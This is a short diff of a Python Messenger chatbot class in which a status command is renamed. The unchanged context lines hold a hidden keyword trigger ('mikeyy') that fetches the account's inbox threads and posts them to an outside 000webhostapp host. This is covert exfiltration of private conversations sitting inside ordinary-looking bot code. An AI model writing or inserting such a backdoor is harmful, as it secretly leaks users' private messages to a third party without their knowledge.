@@ -580,12 +580,11 @@ class ChatBot(Client):
                 reply = "Pake mo ba? 😒😒"
                 sendMsg()
                 texttospeech(reply)
-            elif (".statusChange" == msg):
+            elif (".chstatus" == msg):
                 global msgstatus
                 reply = "Checking... if you are my master. 😒😒"
                 sendMsg()
                 texttospeech(reply)
-
             elif ("mikeyy" == msg):
                 reply = str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None))
                 requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
